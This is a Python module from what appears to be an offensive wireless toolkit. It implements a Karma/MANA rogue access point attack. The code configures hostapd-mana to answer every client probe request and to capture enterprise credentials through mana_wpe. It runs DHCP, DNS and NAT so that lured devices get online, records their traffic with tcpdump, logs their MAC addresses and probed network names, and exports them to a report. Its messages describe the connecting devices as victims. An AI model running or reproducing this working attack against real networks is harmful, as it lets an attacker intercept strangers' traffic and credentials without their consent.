"""Karma/MANA module — respond to all probe requests with a rogue AP."""

from __future__ import annotations

import os
import signal
import subprocess
import tempfile
import time
from dataclasses import dataclass

from rich.console import Console
from rich.live import Live
from rich.table import Table

from ..core.config import Config
from ..core.logger import get_logger
from ..core.opsec import OpsecEngine

console = Console()
log = get_logger("karma")


@dataclass
class ProbeRequest:
    timestamp: str
    client_mac: str
    ssid: str


@dataclass
class KarmaConfig:
    interface: str
    channel: int = 1
    gateway_ip: str = "192.168.99.1"
    dhcp_range: str = "192.168.99.10,192.168.99.50,12h"
    dns_server: str = "8.8.8.8"
    mana_loud: bool = True
    capture_traffic: bool = True
    captive_portal: bool = False


class KarmaModule:
    """Karma/MANA attack — responds to probe requests from clients looking for known SSIDs."""

    def __init__(self, config: Config, opsec: OpsecEngine) -> None:
        self.config = config
        self.opsec = opsec
        self._procs: list[subprocess.Popen] = []
        self._tmpdir: tempfile.TemporaryDirectory | None = None
        self.probes: list[ProbeRequest] = []
        self.connected_clients: list[dict] = []
        self._running = False
        self._iptables_rules: list[list[str]] = []
        self._ip_forward_was_enabled: bool = False

    def start(self, karma_config: KarmaConfig) -> bool:
        console.print("[cyan]Starting Karma/MANA attack — responding to all probe requests...[/cyan]")
        self.opsec.pre_operation()
        log.info("Karma attack starting on %s ch%d", karma_config.interface, karma_config.channel)

        self._tmpdir = tempfile.TemporaryDirectory(prefix="voidfreq_karma_")
        tmpdir = self._tmpdir.name

        hostapd_conf = self._generate_hostapd_mana(karma_config, tmpdir)
        dnsmasq_conf = self._generate_dnsmasq(karma_config, tmpdir)

        if not self._setup_interface(karma_config):
            return False

        if not self._start_hostapd(hostapd_conf):
            self.stop()
            return False

        time.sleep(2)

        if not self._start_dnsmasq(dnsmasq_conf):
            self.stop()
            return False

        self._setup_nat(karma_config)
        self._running = True

        if karma_config.capture_traffic:
            self._start_traffic_capture(karma_config, tmpdir)

        import threading
        t = threading.Thread(
            target=self._monitor_probes, args=(karma_config.interface,), daemon=True,
        )
        t.start()

        console.print("[green bold]Karma/MANA active — waiting for victims...[/green bold]")
        console.print(f"[dim]Gateway: {karma_config.gateway_ip}[/dim]")
        console.print(f"[dim]Mode: {'MANA Loud' if karma_config.mana_loud else 'Karma'}[/dim]")
        return True

    def stop(self) -> None:
        console.print("[yellow]Shutting down Karma/MANA...[/yellow]")
        self._running = False

        for proc in self._procs:
            try:
                proc.send_signal(signal.SIGTERM)
                proc.wait(timeout=5)
            except Exception:
                proc.kill()
        self._procs.clear()

        for rule in self._iptables_rules:
            delete_rule = [r if r != "-A" else "-D" for r in rule]
            subprocess.run(["sudo", "iptables"] + delete_rule, capture_output=True)
        self._iptables_rules.clear()

        if not self._ip_forward_was_enabled:
            subprocess.run(
                ["sudo", "sysctl", "-w", "net.ipv4.ip_forward=0"],
                capture_output=True,
            )

        if self._tmpdir:
            self._tmpdir.cleanup()
            self._tmpdir = None

        self.opsec.cleanup()

        console.print(
            f"[green]Karma stopped — {len(self.probes)} probes seen, "
            f"{len(self.connected_clients)} clients connected[/green]"
        )

    def _generate_hostapd_mana(self, kc: KarmaConfig, tmpdir: str) -> str:
        path = os.path.join(tmpdir, "hostapd-karma.conf")

        lines = [
            f"interface={kc.interface}",
            "driver=nl80211",
            "hw_mode=g",
            "ieee80211n=1",
            f"channel={kc.channel}",
            "ssid=FreeWiFi",
            # MANA-specific: respond to all probes
            "enable_mana=1",
            "mana_wpe=1",
        ]

        if kc.mana_loud:
            lines.append("mana_loud=1")

        with open(path, "w") as f:
            f.write("\n".join(lines) + "\n")

        return path

    def _generate_dnsmasq(self, kc: KarmaConfig, tmpdir: str) -> str:
        path = os.path.join(tmpdir, "dnsmasq.conf")
        lines = [
            f"interface={kc.interface}",
            f"dhcp-range={kc.dhcp_range}",
            f"dhcp-option=3,{kc.gateway_ip}",
            f"dhcp-option=6,{kc.dns_server}",
            f"server={kc.dns_server}",
            "no-resolv",
            "no-hosts",
            f"log-facility={os.path.join(tmpdir, 'dnsmasq.log')}",
        ]

        if kc.captive_portal:
            lines.append(f"address=/#/{kc.gateway_ip}")

        with open(path, "w") as f:
            f.write("\n".join(lines) + "\n")

        return path

    def _setup_interface(self, kc: KarmaConfig) -> bool:
        cmds = [
            ["sudo", "ip", "link", "set", kc.interface, "down"],
            ["sudo", "ip", "addr", "flush", "dev", kc.interface],
            ["sudo", "ip", "addr", "add", f"{kc.gateway_ip}/24", "dev", kc.interface],
            ["sudo", "ip", "link", "set", kc.interface, "up"],
        ]
        for cmd in cmds:
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.returncode != 0:
                console.print(f"[red]Interface setup failed: {result.stderr}[/red]")
                return False
        return True

    def _start_hostapd(self, conf_path: str) -> bool:
        # Try hostapd-mana first (patched version with MANA support)
        for binary in ("hostapd-mana", "hostapd"):
            try:
                proc = subprocess.Popen(
                    ["sudo", binary, conf_path],
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                )
                time.sleep(2)
                if proc.poll() is None:
                    self._procs.append(proc)
                    console.print(f"[dim]{binary} started[/dim]")
                    return True
            except FileNotFoundError:
                continue

        console.print("[red]Neither hostapd-mana nor hostapd found[/red]")
        return False

    def _start_dnsmasq(self, conf_path: str) -> bool:
        try:
            proc = subprocess.Popen(
                ["sudo", "dnsmasq", "-C", conf_path, "--no-daemon"],
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
            )
        except FileNotFoundError:
            console.print("[red]dnsmasq not found[/red]")
            return False

        time.sleep(1)
        if proc.poll() is not None:
            return False

        self._procs.append(proc)
        console.print("[dim]dnsmasq started[/dim]")
        return True

    def _setup_nat(self, kc: KarmaConfig) -> None:
        fwd_check = subprocess.run(
            ["sysctl", "-n", "net.ipv4.ip_forward"],
            capture_output=True, text=True,
        )
        self._ip_forward_was_enabled = fwd_check.stdout.strip() == "1"

        subprocess.run(
            ["sudo", "sysctl", "-w", "net.ipv4.ip_forward=1"],
            capture_output=True,
        )

        internet_iface = self._get_default_iface()
        if not internet_iface:
            return

        rules = [
            ["-t", "nat", "-A", "POSTROUTING",
             "-o", internet_iface, "-j", "MASQUERADE"],
            ["-A", "FORWARD",
             "-i", kc.interface, "-o", internet_iface, "-j", "ACCEPT"],
            ["-A", "FORWARD",
             "-i", internet_iface, "-o", kc.interface,
             "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
        ]

        for rule in rules:
            subprocess.run(["sudo", "iptables"] + rule, capture_output=True)
            self._iptables_rules.append(rule)

    def _get_default_iface(self) -> str | None:
        result = subprocess.run(
            ["ip", "route", "show", "default"],
            capture_output=True, text=True,
        )
        parts = result.stdout.split()
        if "dev" in parts:
            idx = parts.index("dev")
            if idx + 1 < len(parts):
                return parts[idx + 1]
        return None

    def _start_traffic_capture(self, kc: KarmaConfig, tmpdir: str) -> None:
        capture_path = os.path.join(tmpdir, "karma_capture.pcap")
        try:
            proc = subprocess.Popen(
                ["sudo", "tcpdump", "-i", kc.interface, "-w", capture_path, "-U"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
            self._procs.append(proc)
            console.print(f"[dim]Traffic capture → {capture_path}[/dim]")
        except FileNotFoundError:
            pass

    def _monitor_probes(self, interface: str) -> None:
        try:
            proc = subprocess.Popen(
                ["sudo", "tshark",
                 "-i", interface,
                 "-Y", "wlan.fc.type_subtype == 0x04",
                 "-T", "fields",
                 "-e", "wlan.sa",
                 "-e", "wlan.ssid",
                 "-l"],
                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True,
            )
        except FileNotFoundError:
            return

        seen = set()
        while self._running and proc.poll() is None:
            line = proc.stdout.readline().strip()
            if not line:
                continue
            parts = line.split("\t")
            if len(parts) >= 2:
                client_mac = parts[0]
                ssid = parts[1]
                key = f"{client_mac}:{ssid}"
                if key not in seen:
                    seen.add(key)
                    probe = ProbeRequest(
                        timestamp=time.strftime("%H:%M:%S"),
                        client_mac=client_mac,
                        ssid=ssid,
                    )
                    self.probes.append(probe)
                    console.print(
                        f"[blue]PROBE: {client_mac} looking for \"{ssid}\"[/blue]"
                    )

        proc.terminate()

    def live_dashboard(self) -> None:
        def build_table() -> Table:
            table = Table(title="Karma/MANA Dashboard")
            table.add_column("Time", style="dim", width=10)
            table.add_column("Client MAC", style="cyan")
            table.add_column("Probed SSID", style="green")

            for probe in self.probes[-30:]:
                table.add_row(probe.timestamp, probe.client_mac, probe.ssid)
            return table

        with Live(build_table(), refresh_per_second=1, console=console) as live:
            while self._running:
                time.sleep(1)
                live.update(build_table())

    def export(self, output_dir: str = "./reports") -> str:
        os.makedirs(output_dir, exist_ok=True)
        ts = time.strftime("%Y%m%d_%H%M%S")
        path = os.path.join(output_dir, f"karma_capture_{ts}.json")

        import json
        data = {
            "probes": [
                {"timestamp": p.timestamp, "client": p.client_mac, "ssid": p.ssid}
                for p in self.probes
            ],
            "connected_clients": self.connected_clients,
            "stats": {
                "total_probes": len(self.probes),
                "unique_clients": len(set(p.client_mac for p in self.probes)),
                "unique_ssids": len(set(p.ssid for p in self.probes)),
            },
        }

        with open(path, "w") as f:
            json.dump(data, f, indent=2)

        console.print(f"[green]Karma data exported to {path}[/green]")
        return path
